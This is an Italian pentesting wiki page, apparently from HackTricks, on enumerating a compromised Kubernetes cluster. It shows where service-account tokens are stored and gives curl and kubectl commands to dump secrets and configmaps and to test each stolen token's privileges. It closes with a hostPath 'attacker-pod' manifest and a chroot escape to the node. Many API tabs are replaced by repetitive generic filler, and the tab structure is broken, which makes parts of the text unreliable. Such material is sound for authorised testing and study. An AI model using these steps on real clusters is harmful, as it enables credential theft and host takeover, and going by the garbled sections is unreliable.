# Enumerazione di Kubernetes

{% hint style="success" %}
Impara e pratica l'Hacking su AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Sostieni HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.

</details>
{% endhint %}

## Token di Kubernetes

Se hai compromesso l'accesso a una macchina, l'utente potrebbe avere accesso a una piattaforma Kubernetes. Il token si trova di solito in un file indicato dalla variabile d'ambiente **`KUBECONFIG`** o **all'interno di `~/.kube`**.

In questa cartella potresti trovare file di configurazione con **token e configurazioni per connettersi al server API**. In questa cartella puoi trovare anche una cartella di cache con informazioni precedentemente recuperate.

Se hai compromesso un pod all'interno di un ambiente Kubernetes, ci sono altri posti dove puoi trovare token e informazioni sull'attuale ambiente K8:

### Token dell'Account di Servizio

Prima di continuare, se non sai cos'√® un servizio in Kubernetes ti consiglio di **seguire questo link e leggere almeno le informazioni sull'architettura di Kubernetes**.

Preso dalla [documentazione](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server) di Kubernetes:

_"Quando crei un pod, se non specifici un account di servizio, viene assegnato automaticamente l'_ account di servizio predefinito _nello stesso namespace."_

**ServiceAccount** √® un oggetto gestito da Kubernetes e utilizzato per fornire un'identit√† ai processi che vengono eseguiti in un pod.\
Ogni account di servizio ha un segreto ad esso correlato e questo segreto contiene un token di portatore. Questo √® un JSON Web Token (JWT), un metodo per rappresentare in modo sicuro le richieste tra due parti.

Solitamente **una** delle cartelle:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

contengono i file:

* **ca.crt**: √à il certificato ca per controllare le comunicazioni di Kubernetes
* **namespace**: Indica il namespace corrente
* **token**: Contiene il **token di servizio** del pod corrente.

Ora che hai il token, puoi trovare il server API all'interno della variabile d'ambiente **`KUBECONFIG`**. Per ulteriori informazioni esegui `(env | set) | grep -i "kuber|kube`**`"`**

Il token dell'account di servizio viene firmato dalla chiave contenuta nel file **sa.key** e validato da **sa.pub**.

Posizione predefinita su **Kubernetes**:

* /etc/kubernetes/pki

Posizione predefinita su **Minikube**:

* /var/lib/localkube/certs

### Pod Attivi

_**I pod attivi sono**_ pod che contengono un token di account di servizio privilegiato. Un token di account di servizio privilegiato √® un token che ha il permesso di eseguire compiti privilegiati come elencare segreti, creare pod, ecc.

## RBAC

Se non sai cos'√® **RBAC**, **leggi questa sezione**.

## CheatSheet di Enumerazione

Per enumerare un ambiente K8s hai bisogno di un paio di cose:

* Un **token di autenticazione valido**. Nella sezione precedente abbiamo visto dove cercare un token utente e un token di account di servizio.
* L'**indirizzo (**_**https://host:port**_**) dell'API di Kubernetes**. Questo pu√≤ essere di solito trovato nelle variabili d'ambiente e/o nel file di configurazione kube.
* **Opzionale**: Il **ca.crt per verificare il server API**. Questo pu√≤ essere trovato negli stessi posti in cui si trova il token. Questo √® utile per verificare il certificato del server API, ma utilizzando `--insecure-skip-tls-verify` con `kubectl` o `-k` con `curl` non avrai bisogno di questo.

Con questi dettagli puoi **enumerare Kubernetes**. Se per qualche motivo l'**API** √® **accessibile** tramite **Internet**, puoi semplicemente scaricare quelle informazioni ed enumerare la piattaforma dal tuo host.

Tuttavia, di solito il **server API √® all'interno di una rete interna**, quindi dovrai **creare un tunnel** attraverso la macchina compromessa per accedervi dalla tua macchina, oppure puoi **caricare il** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) binario, o utilizzare **`curl/wget/qualsiasi cosa`** per eseguire richieste HTTP grezze al server API.

### Differenze tra i verbi `list` e `get`

Con i permessi **`get`** puoi accedere alle informazioni di asset specifici (_opzione `describe` in `kubectl`_) API:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Se hai il permesso **`list`**, sei autorizzato a eseguire richieste API per elencare un tipo di risorsa (_opzione `get` in `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Se hai il permesso **`watch`**, ti √® consentito eseguire richieste API per monitorare gli asset:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Si apre una connessione in streaming che restituisce l'intero manifesto di un Deployment ogni volta che cambia (o quando ne viene creato uno nuovo).

{% hint style="danger" %}
I seguenti comandi `kubectl` indicano semplicemente come elencare gli oggetti. Se si desidera accedere ai dati, √® necessario utilizzare `describe` invece di `get`
{% endhint %}

### Usando curl

Da dentro un pod √® possibile utilizzare diverse variabili d'ambiente:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
Per impostazione predefinita, il pod pu√≤ **accedere** al **server kube-api** nel nome di dominio **`kubernetes.default.svc`** e puoi vedere la rete kube in **`/etc/resolv.config`** poich√© qui troverai l'indirizzo del server DNS di kubernetes (il ".1" dello stesso intervallo √® il punto finale kube-api).
{% endhint %}

### Usando kubectl

Avendo il token e l'indirizzo del server API, puoi utilizzare kubectl o curl per accedervi come indicato qui:

Per impostazione predefinita, il SERVER API comunica con lo schema `https://`
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> se nell'URL manca `https://`, potresti ricevere un errore come Richiesta Non Valida.

Puoi trovare un [**foglio degli appunti ufficiale di kubectl qui**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). L'obiettivo delle seguenti sezioni √® presentare in modo ordinato diverse opzioni per enumerare e comprendere il nuovo K8s a cui hai ottenuto accesso.

Per trovare la richiesta HTTP che `kubectl` invia, puoi utilizzare il parametro `-v=8`

#### MitM kubectl - Proxyfying kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Configurazione Attuale

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

Se sei riuscito a rubare le credenziali di alcuni utenti, puoi **configurarle localmente** utilizzando qualcosa del genere:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Ottenere Risorse Supportate

Con queste informazioni saprai tutti i servizi che puoi elencare

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
### Ottenere i Privilegi Attuali

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %} 

## Enumerazione API

Durante la fase di enumerazione, √® possibile utilizzare diversi strumenti e tecniche per identificare le API esposte e i servizi offerti. Di seguito sono riportati alcuni metodi comuni utilizzati per enumerare le API in un ambiente Kubernetes:

### Scansione delle intestazioni HTTP

La scansione delle intestazioni HTTP pu√≤ rivelare informazioni utili sulle API esposte, come ad esempio i tipi di autenticazione supportati e le versioni dei servizi.

### Esplorazione dei percorsi dell'API

Esplorare i percorsi dell'API pu√≤ aiutare a identificare risorse nascoste o non documentate che potrebbero essere vulnerabili.

### Analisi del traffico di rete

L'analisi del traffico di rete pu√≤ fornire informazioni sulle chiamate API in corso e sulle interazioni tra i diversi componenti del sistema.

### Utilizzo di strumenti di enumerazione automatizzata

Esistono strumenti specializzati progettati per l'enumerazione delle API, che possono aiutare a identificare rapidamente le risorse esposte.

√à importante condurre un'enumerazione completa delle API per identificare potenziali punti deboli e vulnerabilit√† nel sistema Kubernetes. 

{% endtab %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

Un altro modo per verificare i tuoi privilegi √® utilizzare lo strumento: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

Puoi saperne di pi√π su **Kubernetes RBAC** in:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Una volta che sai quali privilegi** hai, controlla la seguente pagina per capire **se puoi abusarne** per ottenere privilegi elevati:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Ottenere Altri Ruoli

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %} 

## Enumerazione API

Durante la fase di enumerazione, √® possibile utilizzare strumenti come `kubectl` per elencare le risorse API disponibili nel cluster Kubernetes. Ecco alcuni comandi utili:

```bash
kubectl get pods
kubectl get services
kubectl get deployments
kubectl get namespaces
kubectl get configmaps
kubectl get secrets
kubectl get pv
kubectl get pvc
kubectl get nodes
kubectl get roles
kubectl get rolebindings
kubectl get clusterroles
kubectl get clusterrolebindings
```

Questi comandi consentono di ottenere informazioni dettagliate sulle risorse API presenti nel cluster Kubernetes, che possono essere utilizzate per identificare potenziali punti deboli nella sicurezza. 

{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Ottenere i namespace

Kubernetes supporta **cluster virtuali multipli** supportati dallo stesso cluster fisico. Questi cluster virtuali sono chiamati **namespace**.
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %} 

## Enumerazione API

Durante la fase di enumerazione, √® possibile utilizzare strumenti come `kubectl` per elencare i servizi esposti all'interno del cluster Kubernetes. Utilizzare il seguente comando per elencare i servizi:

```bash
kubectl get services --all-namespaces
```

Inoltre, √® possibile utilizzare `kubectl` per ottenere informazioni dettagliate su un servizio specifico utilizzando il seguente comando:

```bash
kubectl describe service <service-name> -n <namespace>
```

Questi comandi possono aiutare a identificare i servizi esposti e a raccogliere informazioni utili durante l'enumerazione del cluster Kubernetes. 

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### Ottenere segreti

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

## Enumerazione API

Durante la fase di enumerazione, √® possibile utilizzare diversi strumenti e tecniche per identificare le risorse esposte dall'API, come elenchi di endpoint, schemi di autenticazione e autorizzazione, nonch√© eventuali errori di configurazione che potrebbero portare a vulnerabilit√†.

Alcuni metodi comuni per enumerare risorse API includono l'analisi dei documenti OpenAPI / Swagger, l'esplorazione manuale degli endpoint e l'utilizzo di strumenti automatizzati come Postman o Burp Suite.

√à importante condurre un'enumerazione completa delle risorse API per identificare potenziali punti deboli nella configurazione e implementazione dell'API, al fine di proteggere adeguatamente le risorse e i dati sensibili.

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

Se riesci a leggere i segreti, puoi utilizzare le seguenti righe per ottenere i privilegi relativi a ciascun token:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Ottenere Account di Servizio

Come discusso all'inizio di questa pagina **quando viene eseguito un pod, di solito gli viene assegnato un account di servizio**. Pertanto, elencare gli account di servizio, i loro permessi e dove sono in esecuzione potrebbe consentire a un utente di ottenere privilegi elevati.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %} 

## Enumerazione API

Durante la fase di enumerazione, √® possibile utilizzare diversi metodi per identificare le API esposte all'interno di un cluster Kubernetes. Alcuni approcci comuni includono:

- **Scansione delle API**: utilizzare strumenti come `kube-hunter` per identificare le API vulnerabili.
- **Esplorazione manuale**: eseguire richieste HTTP dirette per esaminare le risposte dell'API.
- **Esame della documentazione**: cercare la documentazione ufficiale per identificare le API disponibili e i relativi endpoint.

Una volta identificate le API, √® importante condurre un'analisi approfondita per valutare la sicurezza e identificare eventuali potenziali vulnerabilit√†. 

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### Ottenere i Deployments

I deployments specificano i **componenti** che devono essere **eseguiti**.
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

## Enumerazione API

Durante la fase di enumerazione, √® possibile utilizzare diversi strumenti e tecniche per identificare le API esposte all'interno di un cluster Kubernetes. Alcuni metodi comuni includono:

- Utilizzo di strumenti come `kubectl` per elencare i servizi e le risorse all'interno del cluster.
- Esplorazione dei manifesti delle risorse per identificare eventuali endpoint API esposti.
- Analisi dei log delle applicazioni per individuare chiamate API in sospeso o non autorizzate.
- Utilizzo di strumenti di scansione come `kube-hunter` per individuare potenziali vulnerabilit√† nelle API esposte.

Una volta identificate le API, √® importante condurre un'analisi approfondita per valutare la sicurezza e l'eventuale esposizione dei dati sensibili.
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### Ottenere i Pods

I Pods sono i **contenitori** effettivi che verranno **eseguiti**.
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

## Enumerazione API

Durante la fase di enumerazione, √® possibile utilizzare strumenti come `kubectl` per elencare le risorse API disponibili nel cluster Kubernetes. Ecco alcuni comandi utili:

```bash
kubectl get pods
kubectl get services
kubectl get deployments
kubectl get namespaces
kubectl get nodes
kubectl get configmaps
kubectl get secrets
```

Questi comandi consentono di ottenere informazioni sulle risorse API presenti nel cluster Kubernetes, che possono essere utilizzate per identificare potenziali punti deboli nella configurazione di sicurezza. 

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### Ottenere i Servizi

I **servizi** di Kubernetes vengono utilizzati per **esporre un servizio su una porta e un IP specifici** (che fungeranno da bilanciatore di carico per i pod che offrono effettivamente il servizio). Questo √® interessante da sapere per individuare dove √® possibile trovare altri servizi da provare ad attaccare.
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### Ottenere nodi

Ottieni tutti i **nodi configurati all'interno del cluster**.
```
k get nodes
```
{% endtab %}

{% tab title="API" %} 

## Enumerazione API

Durante la fase di enumerazione, √® possibile utilizzare diversi strumenti e tecniche per identificare le API esposte all'interno di un cluster Kubernetes. Alcuni metodi comuni includono:

- Utilizzo di strumenti come `kubectl` per elencare i servizi e le risorse all'interno del cluster.
- Esplorazione dei manifesti delle risorse per identificare le API esposte.
- Analisi delle autorizzazioni e delle policy di rete per individuare le API accessibili.

Una volta identificate le API, √® importante condurre un'analisi approfondita per valutare la sicurezza e identificare eventuali potenziali vulnerabilit√†. 

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### Ottenere DaemonSets

**DaeamonSets** consente di garantire che un **pod specifico sia in esecuzione in tutti i nodi** del cluster (o in quelli selezionati). Se elimini il DaemonSet, i pod gestiti da esso verranno rimossi.
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %} 

## Enumerazione API

Durante la fase di enumerazione, √® possibile utilizzare diversi strumenti e tecniche per identificare le risorse esposte dall'API Kubernetes. Alcuni metodi comuni includono:

- **Scansione delle API**: utilizzare strumenti come `kube-hunter` per individuare possibili vulnerabilit√† e configurazioni non sicure.
- **Esplorazione manuale**: eseguire richieste API dirette utilizzando strumenti come `curl` o Postman per esaminare le risorse disponibili.
- **Enumerazione degli endpoint**: identificare gli endpoint dell'API Kubernetes e testarli per verificare la presenza di vulnerabilit√†.
- **Analisi della documentazione**: esaminare la documentazione dell'API per comprendere le funzionalit√† offerte e identificare possibili punti deboli.

Questi metodi possono aiutare a identificare potenziali rischi di sicurezza e a migliorare la protezione dell'ambiente Kubernetes. 

{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### Ottenere cronjob

I job di cron permettono di pianificare, utilizzando una sintassi simile a crontab, il lancio di un pod che eseguir√† qualche azione.
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %} 
### Enumerazione API

Durante la fase di enumerazione, √® possibile utilizzare diversi strumenti e tecniche per identificare le API esposte all'interno di un cluster Kubernetes. Alcuni metodi comuni includono:

- **Scansione delle API**: utilizzare strumenti come `kube-hunter` per identificare le vulnerabilit√† nelle API esposte.
- **Esplorazione manuale**: eseguire richieste HTTP dirette per esaminare le risposte e identificare eventuali dettagli sensibili.
- **Utilizzo di script**: scrivere script personalizzati per interagire con le API e raccogliere informazioni.

Una volta identificate le API, √® importante condurre un'analisi approfondita per valutare le possibili minacce e vulnerabilit√† associate.
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### Ottenere configMap

Il configMap contiene sempre molte informazioni e file di configurazione che vengono forniti alle app che vengono eseguite in Kubernetes. Di solito √® possibile trovare molte password, segreti, token che vengono utilizzati per connettersi e convalidare altri servizi interni/esterni.
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %} 

## Enumerazione API

Durante la fase di enumerazione, √® possibile utilizzare diversi metodi per identificare le risorse API esposte e i punti di accesso. Di seguito sono riportati alcuni passaggi comuni:

1. **Scansione delle intestazioni HTTP**: esaminare le intestazioni HTTP delle risposte per identificare eventuali informazioni sensibili o versioni specifiche dell'API.

2. **Esplorazione dei percorsi dell'API**: utilizzare strumenti come `curl` o Postman per esplorare i diversi percorsi e parametri dell'API.

3. **Analisi della documentazione dell'API**: cercare la documentazione dell'API per comprendere meglio le funzionalit√† offerte e i metodi supportati.

4. **Enumerazione dei metodi HTTP**: identificare i metodi HTTP supportati dall'API, ad esempio GET, POST, PUT, DELETE, ecc.

5. **Ricerca di endpoint nascosti**: eseguire una scansione approfondita per individuare eventuali endpoint nascosti o non documentati.

6. **Esame dei messaggi di errore**: analizzare attentamente i messaggi di errore restituiti dall'API per identificare eventuali dettagli sensibili o vulnerabilit√†.

Questi passaggi possono aiutare a identificare potenziali punti deboli nell'implementazione dell'API e a migliorare la sicurezza complessiva del sistema. 

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### Ottenere "tutto"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
### **Ottieni i consumi dei Pods**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### Fuga dal pod

Se sei in grado di creare nuovi pod potresti riuscire a fuggire da essi verso il nodo. Per farlo devi creare un nuovo pod utilizzando un file yaml, passare al pod creato e quindi chroot nel sistema del nodo. Puoi utilizzare i pod gi√† esistenti come riferimento per il file yaml poich√© mostrano immagini e percorsi esistenti.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> se hai bisogno di creare un pod su un nodo specifico, puoi utilizzare il seguente comando per ottenere le etichette sul nodo
>
> `k get nodes --show-labels`
>
> Comunemente, kubernetes.io/hostname e node-role.kubernetes.io/master sono tutte buone etichette da selezionare.
>
> [reference]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

Poi crei il tuo file attack.yaml
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[fonte yaml originale](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

Dopo di che crei il pod
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Ora puoi passare al pod creato come segue:
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
E infine esegui il chroot nel sistema del nodo
```bash
chroot /root /bin/bash
```
Informazioni ottenute da: [Kubernetes Namespace Breakout using Insecure Host Path Volume ‚Äî Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attaccare e Difendere Kubernetes: Bust-A-Kube ‚Äì Episodio 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## Riferimenti

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
Impara e pratica l'Hacking su AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Sostieni HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
